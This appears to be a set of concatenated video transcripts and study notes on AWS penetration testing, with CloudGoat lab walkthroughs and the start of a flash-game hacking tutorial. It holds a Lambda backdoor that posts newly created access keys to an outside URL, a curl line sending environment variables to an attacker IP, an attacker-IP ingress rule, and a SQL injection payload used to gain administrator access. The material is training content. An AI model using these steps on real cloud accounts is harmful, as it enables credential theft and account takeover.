in addition provide a token header and only once you provide the specific token header then you can actually query the metadata service otherwise you will get an unauthorized or forbidden error message now this token is called X AWS ec2 Dash metadata Dash token using this token you can query the metadata service so to enforce that we can do AWS ec2 modify Dash instance Dash metadata Dash options provide our instance ID which is if you go ec2 describe Dash instances profile Cloud breach no just Cloud goat um and that by the way that was completely instant because I am running a tool called AWS sea lion that simply ran this command from memory because it realized it was a duplicate command that I ran before I'll put a link to that in the description so the instance ID was right here provide this instance ID and then we say HTTP Dash tokens required and HTTP Dash endpoint enabled and before we run this let's look at exactly what the metadata options are for this specific instance so as we can see it says HTTP tokens optional it does not require the AWS ec2 metadata token it says it's optional so let's make it required and provide our profile of cloud go which has administrator access and so now we made it required to use that metadata token so if we run the same command of curling we now get 401 unauthorized and we cannot query the metadata service without having this metadata token so this is exactly what Azure and gcp has by default although there are API there is an API endpoint in gcp that you can query called slash V1 beta this is the original endpoint in the gcp environment and if your client has this enabled you should definitely check it out and make sure that it gets remediated all ec2 instances that are at least publicly available should have imds V2 enabled",

but these are the main ones elastic block storage highspeed storage volumes best suited for highspeed and frequent data writes and reads these volumes can persist even after ec2 instance destroyed snapshot of ebs volume can be created ec2 instance store used for storing data temporarily physically attached to host computer lost if ec2 instance is destroyed elastic filesystem efs can only be used with linuxbased ec2 instance can be used as a common data source can be used simultaneously by multiple ec2 instance s3 used by ec2 to store ebs snapshots and instance storebacked amis general purpose ssd volumes gp2 low level of latency and costeffective 1 gb to 16 tb provisioned iops ssd i01 volumes like gp2 but superior faster supports more iops input output operations per second designed for databases 4 gb to 16 tb ec2 firewall settings each ec2 has its own firewall security groups linux amis configured to authenticate ssh using key pair authentication rather than a password chapter 6 elastic block stores and snapshots retrieving deleted data ebs volume types and encryption two types of ebs 1 ssd used for transactional workloads frequent read write operations high iops 2 hdd meant for large streaming workloads encryption made with amazon kms implements aes 256bit encryption performed on data at rest snapshots created from volume and all disk i o cmk used to encrypt the data is stored in the volume that is attached to the ec2 instance all ebs volume types support full disk encryption but not all ec2 instances support encrypted volumes the following ec2 instances support ebs encryption general purpose a1 m3 m4 m5 m5d t2 and t3 compute optimized c3 c4 c5 c5d and c5n memory optimized cr1 8xlarge r3 r4 r5 r5d x1 x1e and z1d storage optimized d2 h1 2xlarge h1

reference policies elements condition operators html https docs aws amazon com iam latest userguide reference policies elements condition operators html security best practice to not use inline policies managed policies allow the following 1 reusability 2 central change management 3 versioning and rolling back 4 delegating permissions management inline policies can be converted to managed policies inline policies can be created during or after creation of identity roles and groups roles cannot be added to groups roles default lifespan of role api keys sts assumerole is 1 hour roles allow for stricter auditing and permissions management trust relationships specify who can assume the role and under what conditions json version 20121017 statement effect allow principal service ec2 amazonaws com http ec2 amazonaws com action sts assumerole principals can include other iam users aws services or aws account can assume crossaccount roles for persistence groups used to give a set of users the same permissions a user can be part of 10 groups at most a group can hold up to as many users that are allowed in the account api request signing most aws api calls require data be signed before it is sent to aws servers allows server to verify identity of api caller protect data from modification while it is in transit mostly prevents replay attacks signed request valid for five

profile name test region name uswest2 gets creates session from profile credsclient session client iam pacu can be used to automate some enumeration tasks good for enumeration but outdated and not reliable for exploitation chapter 11 persistence you can backdoor user creds role trust relationships ec2 security groups lambda functions etc best practice is to use sso with temporary federated access rather than an iam user with an access key and secret access key backdooring users create another access key pairaws iam listaccesskeys username user name profile profile each user has limit of two access key pairs so create another access key pair simple easy to detect backdoor removed after compromised iam user account is deleted can privesc with iam createaccesskey backdooring role trust relationships most common backdoor technique role trust policies can be updated at will role trust policies provide access to other aws accounts can update trust policy to create relationship between

address aws ec2 authorizesecuritygroupingress groupid sg0315cp741b51fr4d0 protocol tcp port ports cidr attacker ip backdooring lambda function trigger lambda function upon a certain event works only if cloudtrail logging is enabled because the lambda function backdoor will be configured to trigger upon an event can create backdoor such as creating a second access key pair for a new user then exfiltrating the key pair python import boto3 from botocore vendored import requests def lambda handler event context if event detail eventname createuser client boto3 client iam try response client create access key username event detail requestparamete rs username requests post post url data akid response accesskey accesskeyid sak response accesskey secretaccesskey except pass return best practice to enable cloudtrail across all aws regions it is better to backdoor existing lambda functions as it is stealthier this avoids creating new resources in an environment which can be noisy backdooring ecr if it is possible to log into the container registry pull a docker image and update it in the aws environment then an image can be modified with an attacker s malware to establish persistence chapter 12 pentesting lambda lamba is considered serverless but technically isolated servers are spun up for the duration of a function s runtime filesystem is readonly except for tmp you are a lowprivileged user check environment variables of lambda functions aws lambda listfunctions profile profile event injection if rce can be obtained on the lambda function creds can be exfiltrated via environment variables as opposed to ec2 where it is in the metadata serice read environment variables with env and exfiltrate with curl curl x post d env attacker ip bash runs commands enclosed in backticks first lambda has curl by default may be able to indirectly invoke a function that is set to automatically trigger upon an event in a different service e g lambda function triggers on an

and except to avoid errors from showing up in the logs be aware of the lambda function s timeout it is much better and stealthier to insert malicious code into the function s used dependencies rather than to the function s code itself export lambda function to zip file and then reupload it with modified dependencie chapter 14 targeting other services exploitation of route 53 simple email service ses cloudformation and elastic container registry ecr route 53 route 53 is a scalable dns domain management service good to use for recon allows association of ips and host names can discover domains and subdomains other than for recon route53 is not useful for pentesters too disruptive how malicious attackers exploit route53 change dns records to point to their web server route dns queries between different networks and vpc can provide insight into other networks not hosted within aws or can give insight into other services within vpcs simple email service ses good to use for phishing

the stack stack output values essentially the same thing as parameters but these values were generated during the creation of the stack can potentially have access keys such as if a template creates an iam user with an access key pair stack termination protection termination protection provides additional protection against the termination of a cloudformation stack this requires that you first disable the stack then delete a stack which requires a different set of permissions cannot be leveraged as an attacker but it is good practiceto check this you can run aws cloudformation

give info about target environment and or the user cases of the stackaws cloudformation listexports shows name and value of each export and the stack that exported it stack templatesaws cloudformation gettemplate stackname stack name contains information regarding the setup of various resources can help identify resources misconfigurations hardcoded secrets etc passed roles stacks can be passed

parameters cloudformation updatestack is needed to uncover noecho values note that as a pentester you should also have cloudformation gettemplate it is possible to retrieve the value for noecho parameters with just updatestack but this requires updating a template with our own which would result in the loss of resources that the stack created because we are essentially completely replacing the previously used template instead of modifying it elastic container registry ecr fully managed docker container service for deploying storing and managing docker container images it may be possible to escalate privileges by logging into the container registry and pulling a docker image chapter 15 pentesting cloudtrail auditingthe following keys should be set to true within cloudtrail key description additional info ismultiregional ensures cloudtrail is logging across all regions this is more efficient than creating individual trails for each region additionally new aws regions get released includeglobalserviceevents logs api activity for nonregion specific aws services e g iam and s3 logfilevalidationenabled identify deletion modification of logs kmskeyid the key used to encrypt the logs absence of this key means that the logs are not encrypted if hascustomeventselectors is true then perform the following command to view which events are being logged aws cloudtrail geteventselectors trailname trail name to see if the trail is enabled perform the following command aws cloudtrail gettrailstatus name trail name check if the islogging key is set to true make sure the values for latestdeliveryattempttime and latestdeliveryattemptsucceeded are the same otherwise there may be a problem when cloudtrail is delivering logs to s3 recon unlike cloudtrail logs cloudtrail s event history is immutable using cloudtrail lookupevents it is possible to view the event history of cloudtrail this way you can see cloudtrail events without needing s3 and kms if you do have s3 and kms permissions be careful of downloading logs it may be alarming easier to stay stealthy when the usual activity of users services is known lookupevents is slow as it returns up to 50 events persecond therefore it is important to filter before downloading events from cloudtrail s event history example event history json eventversion 1 06 useridentity type iamuser principalid

      "content"  : "We start off as a low-privileged user who can perform IAM Get and IAM List on all resources. In addition, this user can assume a role which has lambda:* and iam:PassRole on all resources. Using this permission, it was possible to create a function with another role that had AdministratorAccess attached to it. Therefore, we were able to attach AdministratorAccess on the low-privileged user. hello everybody this is zero day and this is the lambda private scenario in the cloud go to series you start off as the chris user who can perform iam get an im list on all resources but chris also has the permission to assume a role and when you list the roles you see that there is one role called lame the manager that you could actually assume and once you get the credentials for this lambda roll you find out that this lambda roll can perform land any land of command on any resource but more importantly you have the iam pass role permission that was given to this lambda manager role and using this permission you can use a higher privileged role that has administrator access it was a lambda debug role and you use this role to pass the administrator access role to a function that you create now this function could be could have any sort of arbitrary script that you want the one that we did in this video was the iam attach policy command which gave the administrator access policy to the chris user we start off as the chris user so let's just put that profile in profile chris and we can copy paste and let's begin by enumerating the permissions of chris so we can look at the managed and inline policies associated with this user so you can do that with the ian list dash attached policies sorry user policies profile chris and we need to provide a username so let's just do that really quick aws sts get dash caller dash identity we put in the profile and now we can get this user and put that in user name chris and this is the manage policy associated with the user before looking at this manage policy let's see if this user has any inline policies so aws iem list user dash policies this looks at all the inline policies and again let's provide the username and there are no inline policies associated with this user so let's see what this managed policy entails so aws get dash policy profile and we need to provide the policy arn policy dash arn which is up here and just just gives us a little more information we see that this policy is only attached to one identity which is our chris user and it's running the v1 version the default version so let's get this uh version so version id v1 and get this policy dash version and these are the permissions associated with this managed policy we can perform iam list and i am get on all resources but on top of that we can also perform assume a role on all resources so let's look at what kind of roles there are in this cloud environment we could do that with the aws iam list dash roles command and these are all the roles associated with this cloud infrastructure here are just a couple of default roles so let's look at the custom user made rules we have a debug role with this arn but we cannot assume it because you need to be part of this lambda service in order to perform this action we also have another role the lambda manager role with this arn and we can perform sts assume role as long as this is our identity and as we can see this is our user chris lambda proves with all of this weird characters at the end over here but this is our user and therefore we can assume this role now before assuming this role let's look at the permissions associated with the role that we can assume but also the role that we cannot assume as they are both of interest so let's look at the attached policies the managed policies associated with both roles and let's look at the inline policies associated with both roles so we can look at the managed policies of a role with the list dash attached as a role dash policies command and we can provide our profile let's make sure to also put iam over there and we need to provide a role name so the role name for lambda manager is this could just put that in there and there is one managed policy associated with this role let's look at let's look if there are any inline policies associated with this rule so list dash role there's policies there's nothing so let's once again get the policy version except this time for this arn so policy dash arn profile chris and let's also put the iam right there and a version id v1 we can see that it is okay to assume that the version that's currently running for this role is v1 because we see right here that this is set to true that the default version for this policy is in fact v1 so this role can perform any lambda function on any resource but it could also do iam pass role which is extremely powerful because what iam pass role will allow us to do is to create some sort of function for example which we can do with lambda we can create some sort of lambda function and pass any role to this function including a role that is higher privilege than us so think of this kind of like a set uid binary except it's set uid for let's say root for example so we have a set we can create a set uid binary for root it's kind of like the equivalent and before we we do that let's look to see uh if there are any we had one other function or one other role it was called somewhere up here the debug role so let's get this as well so we want to get aws i am list dash attach this role this policies and provider profile and also a role name and we have one policy associated with this role and it is the administrator access policy which is quite convenient because we can actually use this role to get administrator access let's also look to see if there are any inline policies and there are none so no inline policies associated with this role but there is one managed policy so this is an extremely powerful role as it has administrator access so if we could somehow use this role to create a function with the permissions of this role then we can create any kind of function including a function that performs an attached attach role policy command and therefore we can get attach a role we can get an administrator access role on our chris user it might sound a little bit confusing at first but as we do it it will make more sense what we will need to do is create a function a lambda function and before we do that let's make sure that we assume the role of that user or of that role that we had permission to assume which was called lambda manager i'll just run this command again it's very important to save the outputs of your commands so let's again just list roles profile chris and this is our role and we want to assume it so aws sts assumed role and we want to provide a role arn and a role session name so our role arn is this and our role session name is the role name of lambda manager right here and we can provide our profile i misspelled it here oral session name and we get the access key secret access key and session token associated with this role so let's just quickly put that in let's configure let's call it lambda manager let's put the axis key the secret access key and the session token so i don't want to open my credentials file because then my other credentials are exposed so let's just put in the echo command and let's put in the session token aws underscore session underscore token equals this and let's put it into the aws credentials file so now when we do the aws sts gets dash caller identity dash profile lambda manager we get the manager and we don't we don't have any kind of errors saying that our session token or our security token is invalid so now that we have this user we want to create some function and use this function with the role of administrator and the role that has that administrator access is that debug role that we saw so let's create a function let's call it uh attach role exploit dot pi so we want to import beot03 moto 3 that's just a software development kit that's integrated with aws it allows you to perform all kinds of different actions in an aws environment and one of them one of the things that we could do is attach user policy so we can attach a policy to our chris user using the attach user policy command we need to first define a function and we can call this function any kind of handler let's call this let's call this uh please subscribe underscore handler and we want to give it an event and a context and we can give we can say client equals boto3 dot client iam because we want to perform an iam command and response equals client dot attach underscore user underscore policy user name equals and we need our username of the chris user so sts get caller dash identity profile chris this is our chris user so let's put this in and we also want a role name so our or our policy and the policy that we would like is the administrator access policy so policy ar n equals and i don't know the the administrative access policy are in off the top of my head so we can just do aws iem list policies profile chris grep administrator access there's tons of different policies so this takes a while but eventually we get this here's the arn and that's it so now we have this python script and we can perform our function which is aws lambda create dash function and there's many different things many different parameters that we need to input with this function and we could do that we could see all the different parameters with the help command it'll show us all the necessary parameters that we must input as well as the optional commands optional parameters so the necessary parameters are function name and role and the optional parameters are all enclosed in brackets so things such as runtime handler code and zip file we would like to input our function as a zip file and yeah let's let's get right to it so we have aws lambda create dash function that's function dash name let's call it please work role our role is that debug rule that we saw earlier that has the administrator access permission associated with it so aws iam list roles and debug this was the role we also want to give it a run time and the handler so let's make sure to do that so we have runtime python 3.8 let's say 3.9 let's give it a handler so our handler was what was it again was it please subscribe yeah please subscribe underscore handler and our function was called attach roll exploit so we first provide the function name which is or the script name which is attach underscore role underscore exploit and we give it our handler so please subscribe underscore handler and what other things do we need we need to provide a zip file as well that contains our script so let's zip and let's call it attach roll exploit dot zip so now we have our zip file so dash dash zip dash file and attach underscore role on exploit.zip and finally we can provide our profile which is lambda lambda manager so this rule failed to satisfy the necessary conditions so what i just did is i plugged in the role session name and i didn't plug in the role arn so what we want is the role arn which is right here so let's just put that in and now we successfully created the function we have please work and it's just initiating into the environment the function is being created creating by now it's probably created it's quite a small function and i'm sure the zip file is very small as well so now what we can do is invoke the function and we could do that with the lambda func the lambda module and let's do help to see all the parameters of invoke so ada was lambda invoke help so when we invoke we must input a function name and an output file so let's do aws lambda dash dash function dash name and our function name was please work so please work and out file which is let's call it output.txt now before we invoke this function let's see the managed policies associated with chris before and after this exploit so if it all works then we should see that there's a difference between the before and after so aws iam and we want to get the list attached user policies of chris so profile chris and we want to give it the username oops exit and i gave it the arn rather than the username let's put the username so this is the only managed policy associated with the chris user and let's see what it is after we run this command we must specify a region i did not put in lambda manager here and we see that there was no error here so let's see cat output no which means the the script successfully ran the reason it's null and not anything else because in the script i didn't tell it to do anything else other than just perform the attach user policy command so now let's list the manage policies associated with this user and we can see that this user now also has administrator access so we successfully ran this function with higher privileges than what we initially had and therefore we were able to get administrator access by passing the debug role over to this function of please work so please work now has administrator access privileges and once we ran that that way we got administrator access on our chris user",

      "content"  : "Video Context - Enumerating user’s permissions - Changing policy’s default permissions - Getting AdministratorAccess hello everybody this is zero day this is the second scenario in the most simple scenario out of the entire cloud good series as of now you start off as a very high privileged user who can perform iam get and i am list permissions on all resources but on top of that you have a iam set default policy version permission which when you list after listing all the policy versions that are associated with your managed policy you see that one of the versions you can perform any action on any resource so all you have to do is set your default policy version as that extremely powerful version and you can do whatever you would like including giving yourself administrator access we were provided the credentials of the first user named raynor as you can see here so let's put it in raynor we'll call him raynor like this and we'll put in the axis key and the secret key we will leave it the default uh region name as us east one so now that we are the rain or user let's try to enumerate so we could do that with the iam module which will show us all the permissions and roles associated with this identity so first of all let's see if we can even do a get user command which is basically a who am i we can see that this is our username here's our arn and we even get a little bit more data related to the tags associated with this user so to find out the permissions we need to see which policies are attached to this user so we can do that with the list dash attached user policies command which will look at all the managed policies that are attached to the specified identity and we need to provide our profile and also our username so we see that the username is this so let's put that in there and these this is our manage policy before looking at that let's see if we have any inline policies which are just policies that are embedded in an identity so we could do that with the list user policies command and again provide the username and we see there are no inline policies associated with this user so let's look at the manage policy and we could do that with the get dash policy command we provide our profile and we'll see that it looks for our policy arn which we have right here so dash desk policy that's ar n put that in and it just gives us a little more data about our policy we can see that our default version id is v1 we have some one attachment and the rest of this data is not that interesting let's look at this version id v1 so we can get an idea of what our permissions are so we could do that with the aws iam get dash policy dash version we specify our profile and we give our arn policy arn which is this and we also have to give a version id which is v1 because that is the version that is right now enabled for our policy and these are the policies associated with this user we have i am get an im list on all resources but more interestingly we can set the default policy version for all resources so right now our default version is v1 but let's look at our other versions to see maybe if other versions contain permissions that we currently do not have and maybe there are permissions that are even more powerful than the one we have right now so first of all let's list our permissions and if there's ever any kind of command that you are not sure about we could just do the aws iam help so iam is the module and of course we can just do help just like this and we can look at all the different commands that are associated with this module so we want to see the versions we want to list the version so let's look for all strings that contain version we have this get dash policy dash version which we just did and we have list policy versions right here so let's do that let's say we wanted more information on this specific command we can just do aws iam put in the command and then type in help just like this and this will show us all the different parameters that can be specified with this command and also the necessary parameter that you must have in order to successfully run this command so all of these are optional parameters and this is the necessary parameter so aws iam list dash policy dash versions and we want to give it a policy arn which we have up here and with this we can see all of the different versions so we have five versions and everything is set to false right now because we are using v1 right now but as we saw from our permissions we can set a default version which is where was it right here set default policy version so let's do aws before actually before we do that we we don't want to set a default version for any policy if we don't know what that policy entails say we set a default version as v2 and v2 had almost no permissions at all then we would be stuck at v2 so let's let's first look at all the different version ids using the command that we used before so here we were looking at v1 here's v2 now v2 allows us to list a bucket get an object and list all buckets for s3 and it's you could do this on all resources so say we suddenly set our default version as v2 then we would be stuck with these permissions and we would not be able to do it we would not be able to continue from that so let's look at the version three version three looks extremely interesting because we can perform any action on any resource let's look at version four version four we can perform any action on any or we cannot perform any action on any resources given that the source ip address is not any of these so this is not as good of a policy because it has these restrictions and it's also not allowing us to do it in the first place it says effect deny so let's look at version five here we can we are allowed to perform ian gets on any resource given that the resource was it were created after 2017 so this is not as good of a re as a policy because we have these restrictions and it's only i am get so version 3 looks like the most interesting policy because it has the most permissions we can do anything we want on any resource so let's set our default policy version as this version set dash default version as our default policy desk version dash desk version dash id we wanted v3 and our policy arn which was this up here and our profile of raynor so now we have those permissions and if we look at our uh let's okay i'll i'll do a who am i again with aws i am get this user here's our username and this is our main only managed policy at the moment but if you remember we could perform any action on any resource right now so let's try to give ourselves the administrator access and we could do that with the attach user policy command just like this attached as user dash policy and we need to provide a username in order to run this command and a policy arn so aws im attach user policy let's give our username and our policy arn so as the policy arn we want administrator access so we could look that up what the administrator access arn administrator access let's see we can go over here administrator access and here is the policy arn for administrators now we can give ourselves that policy and we provide our username and now if we list the same command we are now also the administrator so using this misconfigured user who has this set default policy version permission we were able to get administrator access because the other versions of the policy were too permissive we were able to put any action on any resource and therefore gain administrator access using the attach user policy command thank you for watching and i'll see you in the next video",

everybody this is zero day and this is the first scenario in the cloud go series you start off as a low privileged user named bilbo who can perform iem get in iam list on all resources after enumerating the cloud infrastructure you find that there is a role that you could actually assume and with this role you could actually invoke the vulnerable lambda function you find that there s actually an sql injection vulnerability in the lambda function and as it turns out it s quite handy that this vulnerable lambda function could has the iam attach user policy permissions on the bilbo user so after exporting the lambda function you could actually attach the administrator access managed policy to your user and essentially become an administrator we were provided the credentials of the first user bilbo this is the access key a secret key so let s just put that in i m just gonna configure it uh uh well let s call him bilbo because that s his name and we can put this as his axis

identity which is basically like who am i but for aws i forgot to put bilbo here and we see that this is the username so let s just put that here and we are the bilbo user i m just gonna close this so it s bigger we see there are no attached user policies now what this looks for is the managed policies well maybe the bilbo user doesn t have manage policies as we can see there actually aren t any but it is possible that there are inline policies uh for this user for this particular identity to be exact uh and we could do that with the list user policies command so uh the main difference between list user policies and list attached user policies is this looks for uh managed policies and this looks for inline policies so this is the inline policy of the bilbo user so we can just get that policy and provide the iam module and the policy arn so get dash policy actually looks for the manage policies and as we figure it out there s actually no manage policies associated with the user so what we do instead is get dash user desk policy and then this looks at the inline policies inline policy is just a policy that s embedded in the identity of the user so two users cannot have the same inline policy the online policy might have the same permissions but it s not the same exact policy usually because of that managed policies are used instead of inline policies in a real environment because of the managed policy you can just change a certain permission of the policy and all the users who have that policy are affected this way with an identity policy if everybody has the same permissions for their specific identity if you wanted to change the permissions for every user you d have to manually go and change that so let s provide the username which we found was cg bilbo all of this and the policy name which if we go back up here it was this this is the inline policy and these are all the permissions for the bilbo user we can see that the bilbo user can do any get commands for any resource and it can list anything for any resource this is specifically for iam it could also simulate the custom policy or simulated principle policy this is not really interesting these two are just used for simulating permissions of a user so it doesn t it can t even create api calls it just tells you if you have permissions to do something or not they re not real api calls okay so we can see this but we can t do we can t escalate privileges with these these permissions alone but because we do have this list permission we should start trying to list maybe roles that are in this cloud infrastructure because maybe there is some role that we can assume so if we do this command we see here there s a lot that a lot to see but this is just a default uh aws police roles these are just aws roles these aren t customer managed or anything but if we look further down we see these two roles which are quite interesting this one and this one so if we look at this role we see that the bilbo user which is right here is allowed to do this command this sts assume roll command and this vulnerable lambda function it s quite convenient that they say that it s a vulnerable but this this vulnerable function can only be assumed from another lambda function so okay let s let s first just uh assume this role and the reason we re able to is because we are this user so let s just assume this role right here so aws sts assume dash role and let s just put our profile and we need the role arn and the role dash session dash name so this is the name right here which we copied and the role arn let s just copy that up here Music and we receive the credentials of this lambda function so that we can actually assume it so let s configure a profile let s call it lambda and let s put these credentials Music now note that there s also this session token credential right here but the aws configure profile command did not ask for a session token now we need this if i show you right here uh dash profile lambda it says the security token including the request is invalid well the reason is because we did not put the session token in so what you can do is you can just go into your credentials file now i won t do that here because i have some credentials in there that i don t want that are kind of secret so uh let s let s just put the session token using an echo command so aws underscore session underscore token equals all of this and let s put that there and let s put that at the end of the credentials file Music okay so now that we have that in there we can do the same command aws sts get dash color dash identity profile lambda and now that worked we didn t get that error okay so what can we even do with this role so remember that we were looking at the inline policies of the bilbo user now there s something that s just like that for users but except for roles so now that we are this role let s look at what the inline policies are for this role and we would do that with this command list dash role that s policies and let s put the role name which is uh Music here i ll just run that command really quick aws i am list roles profile bilbo the role name was this and the what was the other one that it asked for oh just the role name okay right because it s just the list role policies come in and this is the inline policy associated with this uh role now let s before we we look at what that is let s look at what the managed policies are of this so we would do that with list dash attached dash roll dash policies Music and we see there are no managed policies associated with this lambda function so just like with the user there was an inline policy but not a managed policy so let s try to get this policy so aws iam get destroyed policy let s put our profile there and it asks for a role name and a policy name so let s put our role name of this and the policy name we see right here is lambda invoker and we see that these are all the permissions of the lambda function or the lambda role that we assumed so we can list tags we can invoke functions this is a particularly interesting and we can get functions so with the get functions command you can actually get the code associated with the lambda function which is you know typically python you have the t bo2 three module uh you can also get policies lambda get policy and we have this list function event so you can perform all of these commands on this these specific resources on the vulnerable function that we saw earlier but also you can list functions for all resources so that s not just for this function uh and you can do an iam get iam list and basically you have all the permissions of the iam uh bilbo user and you have these assumed rule and which makes sense because we are the bilbo user so that s why we have these permissions but we also have these extra permissions right here from the role that we assumed so let s just uh get this function let s let s see before we try to even exploit this function let s see if it s even worth it that are there permissions associated with this function that we don t even have so this is the role name let s copy that and let s do the same thing we just did with our assumed role but let s do that with this function so aws iam get dash roll dash policy dash roll dash name and let s put our profile and policy name oh right let s first list Music whoops list that s real dash policies Music and this is the inline policy associated with that vulnerable lambda function so let s do that same thing where was it get dash roll and with this policy name so now we see that these are all the policies associated with this vulnerable lambda function we see the iam attach user policy which is particularly interesting because this is a super powerful permission with the attach user policy you are basically granting this role permissions to attach any kind of permissions to another user so maybe we could get the administrator privileges from exploiting this function if we were to somehow assume this role or somehow get the function to give us administrator privileges then we would have it because this function can do that on top of that it also has some s3 permissions logs not anything that interesting we can go back to get objects if this does not work but let s let s look into this function here because this definitely has permissions that we don t have with the assumed role so let s try to invoke this function so we go to aws lambda invoke recall that we have the permissions to do that uh and one moment uh aws lambda invoke function dash name so what is the function name let s let s go back and list the function names like clean up a little bit aws lambda list functions profile oh lambda and the function name is this uh well before we even invoke it we actually have to know what what this function even does so let s get the function first aws get that function lambda profile lambda and put the function name right here and it returns with this a long url and what this url is is just the url to download the source code of this vulnerable function so right here we can save it to download sure and let s move downloads to here make the resource and unzip it so these are are the this is the code associated with this function if we look at main pi which has the code associated with this function we see that the function asks for target policies and it says uh select policy name from policies where policy name equals whatever the input is and public equals true now they re nice enough to put all these comments here to show what is allowed so for example policy name this this would be allowed because the public is true but all of these aren t that interesting these are just read only access permissions what we really want is this administrator access but unfortunately it s false so you see if this is if the state if this is not a valid policy if we put a policy that s not valid such as administrator access then it says it s not an approved policy please only choose from the approved ones it s because of this public equals true thing but if we look closely this looks you know just like an sql statement and what we could do if you look here it looks quite insecure because we can actually break out of these quotation marks by just adding a quotation mark ourselves just like a basic uh sql injection attack so if we look further down is there anything interesting doesn t seem to be anything else so let s just put uh our payload in so aws lambda invoke let s put our profile and we want the function name and we want the out file so the function name was that vulnerable i should really save what the function is called but uh we came this far okay here it is here s the function name uh and we also want the out file let s just call it out txt Music and there was an error unhandled so let s just cap this let s see what it says it wants a payload of course we didn t input any payload so we could do a payload with the dash dash payload flag you could even if you re ever not sure about how a function works just type in the function so for example this invoke and then the help function after that so if we go down to payload we can see that this is like the format of the payload but a much better way a much cleaner way is to just create a payload file and just invoke the payload from that file so let s just call it payload json because everything is in json and we ll say that what what did the function want again they wanted Music a policy names and a username so let s put policy Music underscore names Music and let s put administrator access and we can put user underscore name and let s put our username which is something really long there it is copy this pastes and we close okay let s put this in and see what happens so payload uh our file which is payload json and let s see this time it didn t error out because we actually put a payload in so let s cut that it says a is not an approved policy please only choose from approved policies and don t cheat well a is the first letter of this uh policy name uh i think it s just enumerating it s looking for an array and as you can see it actually is for policy and target policies well we just inputted a string so for policy and target policy policy would be equal to a and then in the next for loop would be d and then m and then i so let s put that into a list just like this and let s see if it says that same thing Music administrator access is not an approved policy and that s because it was set to false if you remember right here and it only wants something that s true so let s do that basic uh sql injection attack by inputting a single quote and just commenting out the rest just like this and now let s see if that happens now before i even run this let s quickly just look at what our permissions are for our current bilbo user so if we go to back to where was it i didn t save the command okay well aws i am get dash user dash policy or first let s list it because i forgot what it was called yeah it s a good idea to save the outputs of your commands so you don t have to constantly do stuff like this and same thing with the sts oh at least i have that right here here s the username and this is the policy name so let s get the user policy and it was policy this right nope just types there we go so these are our current permissions uh and one other thing to show before before we uh do this payload is let s look at the attached user policies of profile bilbo now if you remember uh it doesn t have any managed policies but what we can do is through this function give it a manage policy just like administrator access this was the policy name here is the username Music so no attached policies there are no managed policies associated with this user administrator access is a managed policy uh so let s just put this payload in and it didn t error out let s cat and says all managed policies were applied as expected well let s see if we list the manage policies we see that we are now the administrator so we were able to exploit this vulnerable lambda function because of the bad uh validation on user input so right here it was easy to just put in a single quote so what we re really seeing here is us typing in administrator access and then a single quote here and then space dash which is just a comment in sql so basically the sql statement is seeing just this part right here select policy name from policies where policy name equals administrator access so it s like okay it says okay here you go here s administrator access and we got the administrator access permissions so thank you for watching this video i hope it was a it was helpful in understanding the scenario and also about iam permissions and their security it s very important to to make sure that when you re creating lambda functions especially when a user can invoke it that all the lambda functions are secure because just because a lambda function well is not an iam policy i impulses is the main security weakness in cloud infrastructure that doesn t mean that a vulnerable aimed or that a lambda function cannot be vulnerable so thank you for watching this video and i ll see you in the next one",

      "content"  : "This video showcases how to hack any flash game using BurpSuite and JPEXS Decompiler  Note that the information showed in this video should not be used for any illegal purposes  00 00   Video context 00 49   Tools used for the hack 02 22   Swords and Sandals 2 before hack 05 04   Clearing cache and downloading SWF file 08 48   Decompiling SWF file and modifying the code 17 02   Serving the modified SWF file to the server response 17 49   Playing our hacked version of Swords and Sandals 2 hello everybody this is xerox d4y and i ll be showing you how to hack any flash player game uh one of the games that i used to play a lot was this game called swords and sandals two played it about like 10 years ago all the time and i used to go on this website called hacked games where you could just get any kind of uh perk that you wanted for free and just get like like as if whenever you had a skill point you could just increase your skill points and not have any kind of repercussions of doing that and i ve always wanted to know how that kind of thing is done and um i recently figured out how to do stuff like that and i wanted to show it to all of you so uh one of the things that you ll need to perform this kind of um hack is burp suite so this is the burp suite tool this is one of the tools you re going to need it s completely free i ll put a download link in the description another link is this decompiler you ll need that because you re going to be decompiling swf files i ll get into that later it sounds complicated but it s not complicated so this is one of the other tools that you re going to need and for that specific tool you re going to need this file called playerglobal swc um this playerglobal swc file is going to be put into this program right here you just gotta go to settings click on advanced settings and then click on paths and wherever you downloaded that playerglobal swc file you just put that in right here by first clicking on this folder navigating to and then you put it in there i just downloaded this one the 15 0 because that just corresponds to this version of jpegs s i ll also put this in the description and this is just the download link for this jpegs s thing so everything is free you can easily download it and do it yourself okay so here s this game swords and sandals 2  i ll just first show you how it looks before you hack it and then i ll show you after i ll put chapters in this video so if you don t want to see how it looks before you can just skip so anyways i m gonna play the game here so it s loading the game info and that s actually an important part that we re going to be intercepting later  Music  okay uh then we just click play create new gladiator we have nine skill points to start out with every time we increase our skill we get one less skill point okay let s just put it all in strength um and just click check to start the game so there s all this intro it s not that important you fight this guy called fearful prisoner then you just kind of defeat him uh look um at the fact that we start with 30 health points and 110 mana so uh when we hack this game we re going to want to start off with more points than that and maybe even start off with a higher level than just level one so we defeated him we received 2500 gold and we re now level two and we get four skill points to put into our skill sheet so we just increase it there press check and day one glorious freedom uh an important thing to note is don t do any of this stuff uh you know if it s illegal what i m showing you right now is completely legal and it should not be used for any kind of illegal purposes anyways uh so let s go to this uh armory we can just get a breastplate uh note how when we hover over this item it says on the top left there this item is demo locked so somehow the game is realizing that this is just the demo version and because of that it s not letting us buy stuff like this or you know anything that s really good and that looks kind of cool it s not letting us buy it okay so that s just kind of how the game looks like you uh have an arena you have stats and all of that look at how we re level two we have 126 out of 480 experience and we re five six 180 pounds all right we can change all of that quite easily uh so first thing we re gonna have to do is clear the cache and the reason that s important is because right now in our cache is the swf file and all that stands for is um small web format and it s just an adobe flash file that was used for a whole bunch of flash games like this one uh so what we re gonna want is to modify it to make us instantly like level 50 or something okay so uh we go to our cache click on preferences uh then i ll just type in cash over here and here we are clear data i m going to clear all of this and just before i refresh this page i want to intercept it using foxy proxy so i m going to want to turn on burp suite um this is also another like really nice extension to have on mozilla firefox you just um install it using the extension um navigator thing on on firefox so you can just click on options and add your your own uh there s a lot of you know blogs uh and videos on how to set up foxy proxy in burp suite so i will not go over that uh okay so um let s put on actually before we do that before we do that we cleared the cache so let s just reload the page here now before clicking on play game because remember after we click on play game that s when sw the swf file is served let s intercept it let s put uh our burp suite on so that all of the traffic goes through port 8080 which i configured to be burp suite uh i ll turn on intercept to intercept any kind of responses and i ll click on play game so after clicking on play game we re performing a get request on this file w dot w asm it s not that important now we just click on forward and this is the swf file that we were talking about so it s 29 swf so now a really important part is 